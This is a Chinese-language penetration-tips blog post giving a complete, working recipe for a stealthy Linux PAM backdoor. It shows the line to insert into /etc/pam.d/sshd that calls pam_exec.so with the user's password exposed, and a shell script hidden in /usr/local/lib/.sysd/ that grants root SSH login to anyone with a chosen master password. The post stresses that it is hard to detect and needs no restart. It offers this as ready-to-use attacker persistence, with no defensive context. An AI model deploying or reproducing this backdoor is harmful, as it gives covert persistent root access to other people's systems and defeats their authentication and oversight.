---
abbrlink: ''
categories:
- - 渗透小技巧
date: '2026-11-17T17:39:28.489142+08:00'
tags:
- pam 后门
title: Linux pam 后门（无需编译）
updated: '2026-11-17T17:39:30.993+08:00'
---
## 简介

Linux pam 后门是 Linux 后门之中操作最简单且最不容易被发现的后门之一，不过网上流传的 pam 后门基本都是要先查看本机的 pam 环境版本，然后对照着去 github 拉 pam 文件下来，然后改 pam 文件源码，加个 if 语句，编译、替换文件，这一套流程下来，黄花菜都凉了，而且还涉及到编译，如果对方机器上连 gcc 都没安装呢？那就完蛋了。

这次我研究的是一种不用加对版本、改源码、编译的 pam 后门，只需要在 ssh 配置文件加一行语句，然后加一个 sh 脚本就可以利用的 pam 后门，以达到万能钥匙的作用，也不用重启 ssh，不过同样的，这需要 root 权限才可以进行这个流程。本机环境如下，就是简简单单平平无奇的在 Ubuntu 官网下的 desktop 版本：
```undefined
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=26.04
DISTRIB_CODENAME=resolute
DISTRIB_DESCRIPTION="Ubuntu 26.04 LTS"
PRETTY_NAME="Ubuntu 26.04 LTS"
NAME="Ubuntu"
VERSION_ID="26.04"
VERSION="26.04 (Resolute Raccoon)"
VERSION_CODENAME=resolute
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=resolute
LOGO=ubuntu-logo
```
## 步骤一：修改 ssh 配置文件

在我们的 /etc/pam.d 两个关键文件，`common-auth` 和 `sshd`，其区别如下：


| 文件                     | 作用范围                                                     |
| ------------------------ | ------------------------------------------------------------ |
| `/etc/pam.d/sshd`        | **只有 SSH 登录**走这套栈                                    |
| `/etc/pam.d/common-auth` | 被 `sshd`、`login`、`su`、`sudo` 等一起 include 的公共认证栈 |

`/etc/pam.d/sshd` 里有一行：

```undefined
@include common-auth
```
意思是"把 `/etc/pam.d/common-auth` 的内容原样插进来"。所以执行顺序是：

```undefined
/etc/pam.d/sshd 里的行（从上到下）
   ↓ 遇到 @include common-auth
/etc/pam.d/common-auth 里的行（pam_unix 真正校验密码的地方）
```
我们要插的那一行，位置在 `@include common-auth` **之前**——也就是在"正常密码校验"发生之前先跑我们的脚本。

**为什么不改** **`common-auth`****？** 因为那样 `su`、`sudo`、本地登录都会带上万能密码，爆炸半径变大。改 `sshd` 只影响 SSH，干净。

现在我们在 `@include common-auth` 的上面增加一行：

```undefined
auth sufficient pam_exec.so quiet expose_authtok /usr/local/lib/.sysd/pam_hook.sh
```
改完后 /etc/pam.d/sshd 的前十行是这样的：

```undefined
# PAM configuration for the Secure Shell service

auth sufficient pam_exec.so quiet expose_authtok /usr/local/lib/.sysd/pam_hook.sh

# Standard Un*x authentication.
@include common-auth

# Disallow non-root logins when /etc/nologin exists.
account    required     pam_nologin.so

```
改完之后甚至不用重启 ssh

## 步骤二：创建 sh 文件

我们先创建 .sysd 文件夹：

```undefined
mkdir -p /usr/local/lib/.sysd/
```
然后创建 sh 文件：

```undefined
vim /usr/local/lib/.sysd/pam_hook.sh
```
内容如下，如果 root 被禁用，可以更换成其他的用户，将 root 改为其他用户名即可：

```
#!/bin/sh
MAGIC='换成你自己的密码'

[ "$PAM_USER" = "root" ] || exit 1

pw=""
IFS= read -r pw || true

[ "$pw" = "$MAGIC" ] && exit 0
exit 1
```
到这里已经可以用 root + 上面脚本设置的密码登录 ssh 了。Enjoying！
